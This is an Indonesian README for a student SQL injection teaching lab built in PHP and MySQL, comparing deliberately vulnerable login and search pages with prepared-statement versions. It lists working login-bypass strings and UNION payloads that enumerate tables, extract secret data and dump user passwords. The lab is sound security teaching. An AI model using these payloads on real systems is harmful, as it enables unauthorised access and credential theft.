<img width="1366" height="768" alt="image" src="https://github.com/user-attachments/assets/e5660109-0082-4583-8e08-d605e38642a9" />
Bypass Login --Login Rentan
<img width="1366" height="720" alt="Cuplikan layar 2026-04-29 194214" src="https://github.com/user-attachments/assets/f94dc6a6-2b41-4b39-bb10-bb66ccc8a405" />
<img width="1366" height="720" alt="Cuplikan layar 2026-04-29 194248" src="https://github.com/user-attachments/assets/7cddd9e5-aef0-4fa7-9ede-a0766d565c40" />
Ekstraksi Data <img width="1366" height="720" alt="Cuplikan layar 2026-04-29 195737" src="https://github.com/user-attachments/assets/4e4a11d6-e8cc-4b0c-954d-a05dc04d8913" />
Login Aman <img width="1366" height="720" alt="Cuplikan layar 2026-04-29 201257" src="https://github.com/user-attachments/assets/e30db35c-4fb1-4497-a3a0-f533c67e8fe4" />

Pencarian Aman <img width="1366" height="720" alt="image" src="https://github.com/user-attachments/assets/cc3b9350-7c90-49aa-a7ef-5247f41a6040" />



# 🔓 SQL Injection Demo Lab
> Proyek edukasi untuk memahami SQL Injection — Tugas UTS Pemrograman Web

---

## ⚠️ Disclaimer

Proyek ini **hanya untuk tujuan edukasi**. Gunakan **hanya di lingkungan lokal**.
Jangan pernah mencoba teknik ini pada sistem nyata tanpa izin.

---

## 📁 Struktur Proyek

```
sql-injection-demo/
├── index.php                  # Halaman utama / menu
├── config.php                 # Konfigurasi database
├── setup.sql                  # Script untuk membuat database
│
├── assets/
│   └── css/
│       └── style.css          # Stylesheet global
│
├── vulnerable/
│   ├── login.php              # Demo 1: Bypass login (RENTAN)
│   └── search.php             # Demo 2: Ekstraksi data UNION (RENTAN)
│
└── secure/
    ├── login.php              # Demo 3: Login aman (Prepared Statements)
    └── search.php             # Demo 4: Pencarian aman (Prepared Statements)
```

---

## 🚀 Cara Setup

### Prasyarat
- XAMPP / WAMP / Laragon (PHP + MySQL)
- Browser modern

### Langkah-langkah

**1. Copy folder ke htdocs**
```
C:\xampp\htdocs\sql-injection-demo\
```

**2. Setup database**

Buka phpMyAdmin → klik tab "SQL" → paste isi `setup.sql` → klik Go.

Atau via terminal MySQL:
```bash
mysql -u root -p < setup.sql
```

**3. Sesuaikan config.php**
```php
define('DB_HOST', 'localhost');
define('DB_USER', 'root');   // sesuaikan
define('DB_PASS', '');       // sesuaikan
define('DB_NAME', 'sqli_demo');
```

**4. Akses di browser**
```
http://localhost/sql-injection-demo/
```

---

## 🧪 Cara Bermain

### Demo 1 — Bypass Login (Rentan)
URL: `http://localhost/sql-injection-demo/vulnerable/login.php`

Coba payload berikut di kolom **Username** (password bisa apa saja):
```
admin' --
' OR '1'='1
' OR 1=1 --
```

### Demo 2 — Ekstraksi Data UNION (Rentan)
URL: `http://localhost/sql-injection-demo/vulnerable/search.php`

Coba payload berikut di kolom **Pencarian**:
```sql
-- Lihat semua tabel
%' UNION SELECT table_name,table_schema,NULL FROM information_schema.tables-- -

-- Eksfiltrasi data rahasia
%' UNION SELECT id,data_name,data_value FROM secret_data-- -

-- Ambil semua password user
%' UNION SELECT id,username,password FROM users-- -
```

### Demo 3 & 4 — Versi Aman
Coba payload yang **sama** — tidak akan berhasil!

---

## 🛡️ Perbedaan Kunci: Rentan vs Aman

| Aspek | ❌ Rentan | ✅ Aman |
|-------|----------|--------|
| Query | String langsung digabung | Prepared Statement (`?`) |
| Input | Tidak divalidasi | Whitelist regex |
| Resiko | Bypass login, ekstraksi data | Terlindungi |

---

## 📚 Referensi

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PHP PDO Prepared Statements](https://www.php.net/manual/en/pdo.prepared-statements.php)
- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
